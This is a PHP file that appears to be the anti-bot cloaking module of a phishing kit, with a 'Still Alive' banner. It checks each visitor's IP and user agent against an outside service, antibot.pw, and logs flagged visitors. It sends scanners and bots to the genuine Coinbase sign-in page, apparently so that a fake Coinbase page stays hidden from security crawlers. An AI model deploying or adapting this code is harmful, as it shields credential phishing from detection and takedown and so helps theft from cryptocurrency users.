<?php
/*
 ____    __         ___    ___       ______   ___                          
/\  _`\ /\ \__  __ /\_ \  /\_ \     /\  _  \ /\_ \    __                   
\ \,\L\_\ \ ,_\/\_\\//\ \ \//\ \    \ \ \L\ \\//\ \  /\_\  __  __     __   
 \/_\__ \\ \ \/\/\ \ \ \ \  \ \ \    \ \  __ \ \ \ \ \/\ \/\ \/\ \  /'__`\ 
   /\ \L\ \ \ \_\ \ \ \_\ \_ \_\ \_   \ \ \/\ \ \_\ \_\ \ \ \ \_/ |/\  __/ 
   \ `\____\ \__\\ \_\/\____\/\____\   \ \_\ \_\/\____\\ \_\ \___/ \ \____\
    \/_____/\/__/ \/_/\/____/\/____/    \/_/\/_/\/____/ \/_/\/__/   \/____/

 * @Facebook: https://www.facebook.com/ownerstillalive/
*/
$config_antibot = trim(file_get_contents("antibot.ini"));
if(isset($config_antibot)) {
    function getUserIPszz()
    {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }else{
            $ip = $remote;
        }

        return $ip;
    }
    $ip = getUserIPszz();
    if($_SESSION['antibot_wasChecked'] == false || !isset($_SESSION['antibot_wasChecked'])){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=".$ip."&apikey=".$config_antibot."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
        $data = curl_exec($ch);
        curl_close($ch);
        $_SESSION['antibot_wasChecked'] = true;
        $x = json_decode($data,true);
        if($x['is_bot']){
            $_SESSION['is_bot']  = true;
            $file = fopen("logs/antibot-block.txt","a");
            $message = "$ip|Antibot Blocker"."\n";
            fwrite($file, $message);
            fclose($file);
            $click = fopen("logs/total_bot.txt","a");
            fwrite($click,"$ip|Antibot Blocker"."\n");
            fclose($click);
            header("location: https://www.coinbase.com/signin");
            exit();
            
        }else{
          $_SESSION['is_bot']  = false;
        }

    }
}
